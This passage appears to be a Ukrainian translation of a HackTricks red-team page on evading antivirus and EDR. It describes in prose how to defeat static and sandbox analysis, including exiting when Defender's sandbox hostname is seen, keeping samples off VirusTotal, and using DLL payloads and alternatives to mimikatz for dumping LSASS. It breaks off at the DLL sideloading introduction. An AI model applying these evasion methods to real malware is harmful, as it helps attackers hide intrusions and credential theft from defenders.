# –£—Ö–∏–ª–µ–Ω–Ω—è –≤—ñ–¥ –∞–Ω—Ç–∏–≤—ñ—Ä—É—Å—ñ–≤ (AV)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF** –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –ø—Ä–æ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫—ñ–Ω–≥-—Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

**–¶—é —Å—Ç–æ—Ä—ñ–Ω–∫—É –Ω–∞–ø–∏—Å–∞–≤** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **–ú–µ—Ç–æ–¥–æ–ª–æ–≥—ñ—è —É—Ö–∏–ª–µ–Ω–Ω—è –≤—ñ–¥ AV**

–ù–∞—Ä–∞–∑—ñ AV –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Ä—ñ–∑–Ω—ñ –º–µ—Ç–æ–¥–∏ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏, —á–∏ —î —Ñ–∞–π–ª —à–∫—ñ–¥–ª–∏–≤–∏–º, —á–∏ –Ω—ñ: —Å—Ç–∞—Ç–∏—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑, –¥–∏–Ω–∞–º—ñ—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑ —Ç–∞ –¥–ª—è –±—ñ–ª—å—à —Ä–æ–∑—à–∏—Ä–µ–Ω–∏—Ö EDR - –ø–æ–≤–µ–¥—ñ–Ω–∫–æ–≤–∏–π –∞–Ω–∞–ª—ñ–∑.

### **–°—Ç–∞—Ç–∏—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑**

–°—Ç–∞—Ç–∏—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑ –¥–æ—Å—è–≥–∞—î—Ç—å—Å—è —à–ª—è—Ö–æ–º –ø–æ–∑–Ω–∞—á–µ–Ω–Ω—è –≤—ñ–¥–æ–º–∏—Ö —à–∫—ñ–¥–ª–∏–≤–∏—Ö —Ä—è–¥–∫—ñ–≤ –∞–±–æ –º–∞—Å–∏–≤—ñ–≤ –±–∞–π—Ç—ñ–≤ —É –±—ñ–Ω–∞—Ä–Ω–æ–º—É –∞–±–æ —Å–∫—Ä–∏–ø—Ç–æ–≤–æ–º—É —Ñ–∞–π–ª—ñ, –∞ —Ç–∞–∫–æ–∂ –≤–∏—Ç—è–≥—É–≤–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∑ —Å–∞–º–æ–≥–æ —Ñ–∞–π–ª—É (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –æ–ø–∏—Å —Ñ–∞–π–ª—É, –Ω–∞–∑–≤–∞ –∫–æ–º–ø–∞–Ω—ñ—ó, —Ü–∏—Ñ—Ä–æ–≤—ñ –ø—ñ–¥–ø–∏—Å–∏, –∑–Ω–∞—á–æ–∫, –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–∞ —Å—É–º–∞ —Ç–æ—â–æ). –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤—ñ–¥–æ–º–∏—Ö –∑–∞–≥–∞–ª—å–Ω–æ–¥–æ—Å—Ç—É–ø–Ω–∏—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ —à–≤–∏–¥—à–æ–≥–æ –≤–∏—è–≤–ª–µ–Ω–Ω—è, –æ—Å–∫—ñ–ª—å–∫–∏ —ó—Ö, –π–º–æ–≤—ñ—Ä–Ω–æ, –≤–∂–µ –ø—Ä–æ–∞–Ω–∞–ª—ñ–∑–æ–≤–∞–Ω–æ —ñ –ø–æ–∑–Ω–∞—á–µ–Ω–æ —è–∫ —à–∫—ñ–¥–ª–∏–≤—ñ. –Ñ –∫—ñ–ª—å–∫–∞ —Å–ø–æ—Å–æ–±—ñ–≤ –æ–±—ñ–π—Ç–∏ —Ü–µ–π –≤–∏–¥ –≤–∏—è–≤–ª–µ–Ω–Ω—è:

* **–®–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è**

–Ø–∫—â–æ –≤–∏ –∑–∞—à–∏—Ñ—Ä—É—î—Ç–µ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª, AV –Ω–µ –∑–º–æ–∂–µ –≤–∏—è–≤–∏—Ç–∏ –≤–∞—à—É –ø—Ä–æ–≥—Ä–∞–º—É, –∞–ª–µ –≤–∞–º –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è —è–∫–∏–π—Å—å –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—á –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Ç–∞ –∑–∞–ø—É—Å–∫—É –ø—Ä–æ–≥—Ä–∞–º–∏ –≤ –ø–∞–º'—è—Ç—ñ.

* **–û–±—Ñ—É—Å–∫–∞—Ü—ñ—è**

–Ü–Ω–æ–¥—ñ –≤—Å–µ, —â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑—Ä–æ–±–∏—Ç–∏, —Ü–µ –∑–º—ñ–Ω–∏—Ç–∏ –¥–µ—è–∫—ñ —Ä—è–¥–∫–∏ —É –≤–∞—à–æ–º—É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ –∞–±–æ —Å–∫—Ä–∏–ø—Ç—ñ, —â–æ–± –ø—Ä–æ–π—Ç–∏ –º–∏–º–æ AV, –∞–ª–µ —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ —á–∞—Å–æ–º—ñ—Ä–Ω–∏–º –∑–∞–≤–¥–∞–Ω–Ω—è–º, –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ–≥–æ, —â–æ –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—è –æ–±—Ñ—É—Å–∫—É–≤–∞—Ç–∏.

* **–Ü–Ω–¥–∏–≤—ñ–¥—É–∞–ª—å–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏**

–Ø–∫—â–æ –≤–∏ —Ä–æ–∑—Ä–æ–±–ª—è—î—Ç–µ –≤–ª–∞—Å–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, –Ω–µ –±—É–¥–µ –≤—ñ–¥–æ–º–∏—Ö –ø–æ–≥–∞–Ω–∏—Ö –ø—ñ–¥–ø–∏—Å—ñ–≤, –∞–ª–µ —Ü–µ –ø–æ—Ç—Ä–µ–±—É—î –±–∞–≥–∞—Ç–æ —á–∞—Å—É —Ç–∞ –∑—É—Å–∏–ª—å.

{% hint style="info" %}
–î–æ–±—Ä–∏–π —Å–ø–æ—Å—ñ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Å—Ç–∞—Ç–∏—á–Ω–∏–π –≤–∏—è–≤–ª–µ–Ω–Ω—è Windows Defender - [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). –í—ñ–Ω –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É —Ä–æ–∑–±–∏–≤–∞—î —Ñ–∞–π–ª –Ω–∞ –∫—ñ–ª—å–∫–∞ —Å–µ–≥–º–µ–Ω—Ç—ñ–≤, –∞ –ø–æ—Ç—ñ–º –≤–∏–º–∞–≥–∞—î –≤—ñ–¥ Defender –ø—Ä–æ—Å–∫–∞–Ω—É–≤–∞—Ç–∏ –∫–æ–∂–µ–Ω –∑ –Ω–∏—Ö –æ–∫—Ä–µ–º–æ, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º, –≤—ñ–Ω –º–æ–∂–µ —Ç–æ—á–Ω–æ —Å–∫–∞–∑–∞—Ç–∏, —è–∫—ñ —Ä—è–¥–∫–∏ –∞–±–æ –±–∞–π—Ç–∏ –ø–æ–∑–Ω–∞—á–µ–Ω—ñ —É –≤–∞—à–æ–º—É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ.
{% endhint %}

–î—É–∂–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É—é –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ —Ü–µ–π [–ø–ª–µ–π–ª–∏—Å—Ç –Ω–∞ YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) –ø—Ä–æ –ø—Ä–∞–∫—Ç–∏—á–Ω–µ —É—Ö–∏–ª–µ–Ω–Ω—è –≤—ñ–¥ AV.

### **–î–∏–Ω–∞–º—ñ—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑**

–î–∏–Ω–∞–º—ñ—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ AV –∑–∞–ø—É—Å–∫–∞—î –≤–∞—à –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª —É –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ —Ç–∞ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—î –∑–∞ —à–∫—ñ–¥–ª–∏–≤–æ—é –¥—ñ—è–ª—å–Ω—ñ—Å—Ç—é (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Å–ø—Ä–æ–±–∞ —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ —Ç–∞ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –ø–∞—Ä–æ–ª—ñ –≤–∞—à–æ–≥–æ –±—Ä–∞—É–∑–µ—Ä–∞, –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –º—ñ–Ω—ñ–¥–∞–º–ø—É –Ω–∞ LSASS —Ç–æ—â–æ). –¶—è —á–∞—Å—Ç–∏–Ω–∞ –º–æ–∂–µ –±—É—Ç–∏ —Ç—Ä–æ—Ö–∏ —Å–∫–ª–∞–¥–Ω—ñ—à–æ—é –¥–ª—è —Ä–æ–±–æ—Ç–∏, –∞–ª–µ –æ—Å—å –¥–µ—è–∫—ñ —Ä–µ—á—ñ, —è–∫—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ –¥–ª—è —É—Ö–∏–ª–µ–Ω–Ω—è –≤—ñ–¥ –ø—ñ—Å–æ—á–Ω–∏—Ü—å.

* **–°–æ–Ω –ø–µ—Ä–µ–¥ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è–º** –ó–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ–≥–æ, —è–∫ —Ü–µ —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ, —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ —á—É–¥–æ–≤–∏–º —Å–ø–æ—Å–æ–±–æ–º –æ–±—ñ–π—Ç–∏ –¥–∏–Ω–∞–º—ñ—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑ AV. –£ AV –¥—É–∂–µ –º–∞–ª–æ —á–∞—Å—É –¥–ª—è —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤, —â–æ–± –Ω–µ –ø–µ—Ä–µ—Ä–∏–≤–∞—Ç–∏ —Ä–æ–±–æ—Ç—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —Ç–æ–º—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ç—Ä–∏–≤–∞–ª–∏—Ö –ø–µ—Ä–µ—Ä–≤ –º–æ–∂–µ –∑–∞–≤–∞–∂–∞—Ç–∏ –∞–Ω–∞–ª—ñ–∑—É –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤. –ü—Ä–æ–±–ª–µ–º–∞ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ –±–∞–≥–∞—Ç–æ –ø—ñ—Å–æ—á–Ω–∏—Ü—å AV –º–æ–∂—É—Ç—å –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ–ø—É—Å—Ç–∏—Ç–∏ –ø–µ—Ä–µ—Ä–≤—É, –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ–≥–æ, —è–∫ –≤–æ–Ω–∞ —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–∞.
* **–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —Ä–µ—Å—É—Ä—Å—ñ–≤ –º–∞—à–∏–Ω–∏** –ó–∞–∑–≤–∏—á–∞–π —É –ø—ñ—Å–æ—á–Ω–∏—Ü—è—Ö –¥—É–∂–µ –º–∞–ª–æ —Ä–µ—Å—É—Ä—Å—ñ–≤ –¥–ª—è —Ä–æ–±–æ—Ç–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, < 2 –ì–ë –û–ó–ü), —ñ–Ω–∞–∫—à–µ –≤–æ–Ω–∏ –º–æ–∂—É—Ç—å —Å–ø–æ–≤—ñ–ª—å–Ω–∏—Ç–∏ —Ä–æ–±–æ—Ç—É –º–∞—à–∏–Ω–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –¢—É—Ç –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –±—É—Ç–∏ –¥—É–∂–µ –∫—Ä–µ–∞—Ç–∏–≤–Ω–∏–º–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø–µ—Ä–µ–≤—ñ—Ä—è—é—á–∏ —Ç–µ–º–ø–µ—Ä–∞—Ç—É—Ä—É –ø—Ä–æ—Ü–µ—Å–æ—Ä–∞ –∞–±–æ –Ω–∞–≤—ñ—Ç—å —à–≤–∏–¥–∫—ñ—Å—Ç—å –æ–±–µ—Ä—Ç–∞–Ω–Ω—è –≤–µ–Ω—Ç–∏–ª—è—Ç–æ—Ä–∞, –Ω–µ –≤—Å–µ –±—É–¥–µ —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ –≤ –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ.
* **–ü–µ—Ä–µ–≤—ñ—Ä–∫–∏, —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ –¥–ª—è –º–∞—à–∏–Ω–∏** –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –Ω–∞—Ü—ñ–ª–∏—Ç–∏—Å—è –Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —á–∏—î —Ä–æ–±–æ—á–µ –º—ñ—Å—Ü–µ –ø—Ä–∏—î–¥–Ω–∞–Ω–µ –¥–æ –¥–æ–º–µ–Ω—É "contoso.local", –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –¥–æ–º–µ–Ω –∫–æ–º–ø'—é—Ç–µ—Ä–∞, —â–æ–± –ø–µ—Ä–µ–∫–æ–Ω–∞—Ç–∏—Å—è, —á–∏ –≤—ñ–Ω –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î —Ç–æ–º—É, —è–∫–∏–π –≤–∏ –≤–∫–∞–∑–∞–ª–∏, —è–∫—â–æ –Ω—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–º–∞–≥–∞—Ç–∏ –≤–∏—Ö–æ–¥—É –∑ –ø—Ä–æ–≥—Ä–∞–º–∏.

–í–∏—è–≤–∏–ª–æ—Å—è, —â–æ –∫–æ–º–ø'—é—Ç–µ—Ä –≤ –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ Microsoft Defender –º–∞—î —ñ–º'—è HAL9TH, —Ç–æ–º—É –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —ñ–º'—è –∫–æ–º–ø'—é—Ç–µ—Ä–∞ —É —Å–≤–æ—î–º—É —à–∫—ñ–¥–ª–∏–≤–æ–º—É –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–º—É –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—ñ –ø–µ—Ä–µ–¥ –¥–µ—Ç–æ–Ω–∞—Ü—ñ—î—é, —è–∫—â–æ —ñ–º'—è –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î HAL9TH, —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å —É –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ –∑–∞—Ö–∏—Å–Ω–∏–∫–∞, —Ç–æ–º—É –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–º–∞–≥–∞—Ç–∏ –≤–∏—Ö–æ–¥—É –∑ –ø—Ä–æ–≥—Ä–∞–º–∏.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>–¥–∂–µ—Ä–µ–ª–æ: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

–î–µ—è–∫—ñ —ñ–Ω—à—ñ –¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω—ñ –ø–æ—Ä–∞–¥–∏ –≤—ñ–¥ [@mgeeky](https://twitter.com/mariuszbit) –¥–ª—è –ø—Ä–æ—Ç–∏—Å—Ç–æ—è–Ω–Ω—è –ø—ñ—Å–æ—á–Ω–∏—Ü—è–º

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

–Ø–∫ –º–∏ –≤–∂–µ –≥–æ–≤–æ—Ä–∏–ª–∏ —É —Ü—å–æ–º—É –ø–æ—Å—Ç—ñ, **–≤—ñ–¥–∫—Ä–∏—Ç—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏** –≤—Ä–µ—à—Ç—ñ-—Ä–µ—à—Ç **–±—É–¥—É—Ç—å –≤–∏—è–≤–ª–µ–Ω—ñ**, —Ç–æ–º—É –≤–∞–º —Å–ª—ñ–¥ –∑–∞–¥–∞—Ç–∏ —Å–æ–±—ñ –ø–∏—Ç–∞–Ω–Ω—è:

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –≤–∏—Ç—è–≥–Ω—É—Ç–∏ LSASS, **—á–∏ –≤–∞–º –¥—ñ–π—Å–Ω–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ mimikatz**? –ê–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —ñ–Ω—à–∏–π –ø—Ä–æ–µ–∫—Ç, —è–∫–∏–π –º–µ–Ω—à –≤—ñ–¥–æ–º–∏–π —ñ —Ç–∞–∫–æ–∂ –≤–∏—Ç—è–≥—É—î LSASS.

–ü—Ä–∞–≤–∏–ª—å–Ω–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—å, –π–º–æ–≤—ñ—Ä–Ω–æ, –ø–æ–ª—è–≥–∞—î –≤ –æ—Å—Ç–∞–Ω–Ω—å–æ–º—É. –ë–µ—Ä—É—á–∏ mimikatz —è–∫ –ø—Ä–∏–∫–ª–∞–¥, —Ü–µ, –π–º–æ–≤—ñ—Ä–Ω–æ, –æ–¥–∏–Ω –∑ –Ω–∞–π–±—ñ–ª—å—à –ø–æ–∑–Ω–∞—á–µ–Ω–∏—Ö —à–∫—ñ–¥–ª–∏–≤–∏—Ö –ø—Ä–æ–≥—Ä–∞–º AV —Ç–∞ EDR, —Ö–æ—á–∞ —Å–∞–º –ø—Ä–æ–µ–∫—Ç –¥—É–∂–µ –∫—Ä—É—Ç–∏–π, –∑ –Ω–∏–º —Ç–∞–∫–æ–∂ –≤–∞–∂–∫–æ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏, —â–æ–± –æ–±—ñ–π—Ç–∏ AV, —Ç–æ–º—É –ø—Ä–æ—Å—Ç–æ —à—É–∫–∞–π—Ç–µ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∏ –¥–ª—è –¥–æ—Å—è–≥–Ω–µ–Ω–Ω—è —Å–≤–æ—î—ó –º–µ—Ç–∏.

{% hint style="info" %}
–ü—Ä–∏ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –≤–∞—à–∏—Ö –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—å –¥–ª—è —É—Ö–∏–ª–µ–Ω–Ω—è, –ø–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ **–≤–∏–º–∫–Ω–µ–Ω–æ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è –∑—Ä–∞–∑–∫—ñ–≤** –≤ –∑–∞—Ö–∏—Å–Ω–∏–∫—É, —ñ, –±—É–¥—å –ª–∞—Å–∫–∞, —Å–µ—Ä–π–æ–∑–Ω–æ, **–ù–ï –ó–ê–í–ê–ù–¢–ê–ñ–£–ô–¢–ï –ù–ê VIRUSTOTAL**, —è–∫—â–æ –≤–∞—à–∞ –º–µ—Ç–∞ - –¥–æ—Å—è–≥–Ω–µ–Ω–Ω—è —É—Ö–∏–ª–µ–Ω–Ω—è –≤ –¥–æ–≤–≥–æ—Å—Ç—Ä–æ–∫–æ–≤—ñ–π –ø–µ—Ä—Å–ø–µ–∫—Ç–∏–≤—ñ. –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –≤–∏—è–≤–ª—è—î—Ç—å—Å—è –≤–∞—à–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –ø–µ–≤–Ω–∏–º AV, –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –π–æ–≥–æ –Ω–∞ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω—É –º–∞—à–∏–Ω—É, —Å–ø—Ä–æ–±—É–π—Ç–µ –≤–∏–º–∫–Ω—É—Ç–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è –∑—Ä–∞–∑–∫—ñ–≤ —Ç–∞ –ø—Ä–æ—Ç–µ—Å—Ç—É–π—Ç–µ —Ç–∞–º, –ø–æ–∫–∏ –Ω–µ –±—É–¥–µ—Ç–µ –∑–∞–¥–æ–≤–æ–ª–µ–Ω—ñ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–º.
{% endhint %}

## EXE –ø—Ä–æ—Ç–∏ DLL

–ö–æ–ª–∏ —Ü–µ –º–æ–∂–ª–∏–≤–æ, –∑–∞–≤–∂–¥–∏ **–ø—Ä—ñ–æ—Ä–∏—Ç–∏–∑—É–π—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è DLL –¥–ª—è —É—Ö–∏–ª–µ–Ω–Ω—è**, –Ω–∞ –º–æ—î–º—É –¥–æ—Å–≤—ñ–¥—ñ, —Ñ–∞–π–ª–∏ DLL –∑–∞–∑–≤–∏—á–∞–π **–º–µ–Ω—à–µ –≤–∏—è–≤–ª—è—é—Ç—å—Å—è** —Ç–∞ –∞–Ω–∞–ª—ñ–∑—É—é—Ç—å—Å—è, —Ç–æ–º—É —Ü–µ –¥—É–∂–µ –ø—Ä–æ—Å—Ç–∏–π —Ç—Ä—é–∫ –¥–ª—è —É–Ω–∏–∫–Ω–µ–Ω–Ω—è –≤–∏—è–≤–ª–µ–Ω–Ω—è —É –¥–µ—è–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö (—è–∫—â–æ –≤–∞—à–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–∞—î —è–∫–∏–π—Å—å —Å–ø–æ—Å—ñ–± –∑–∞–ø—É—Å–∫—É —è–∫ DLL, –∑–≤–∏—á–∞–π–Ω–æ).

–Ø–∫ –º–∏ –º–æ–∂–µ–º–æ –ø–æ–±–∞—á–∏—Ç–∏ –Ω–∞ —Ü—å–æ–º—É –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—ñ, –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è DLL –≤—ñ–¥ Havoc –º–∞—î —Ä—ñ–≤–µ–Ω—å –≤–∏—è–≤–ª–µ–Ω–Ω—è 4/26 –Ω–∞ antiscan.me, —Ç–æ–¥—ñ —è–∫ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è EXE –º–∞—î —Ä—ñ–≤–µ–Ω—å –≤–∏—è–≤–ª–µ–Ω–Ω—è 7/26.

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>–ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è antiscan.me –∑–≤–∏—á–∞–π–Ω–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è EXE Havoc –∑–≤–∏—á–∞–π–Ω–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è DLL Havoc</p></figcaption></figure>

–¢–µ–ø–µ—Ä –º–∏ –ø–æ–∫–∞–∂–µ–º–æ –¥–µ—è–∫—ñ —Ç—Ä—é–∫–∏, —è–∫—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑ —Ñ–∞–π–ª–∞–º–∏ DLL, —â–æ–± –±—É—Ç–∏ –Ω–∞–±–∞–≥–∞—Ç–æ –±—ñ–ª—å—à –ø—Ä–∏—Ö–æ–≤–∞–Ω–∏–º–∏.
## DLL –°–∞–π–¥–ª–æ–∞–¥—ñ–Ω–≥ —Ç–∞ –ü—Ä–æ–∫—Å—ñ

**DLL –°–∞–π–¥–ª–æ–∞–¥—ñ–Ω–≥** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø–æ—Ä—è–¥–æ–∫ –ø–æ—à—É–∫—É DLL, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—á, —Ä–æ–∑—Ç–∞—à–æ–≤—É—é—á–∏ —è–∫ –∂–µ—Ä—Ç–≤—É, —Ç–∞–∫ —ñ –∑–ª–æ–≤–º–∏—Å–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –ø–æ—Ä—É—á –æ–¥–Ω–µ –∑ –æ–¥–Ω–∏–º.

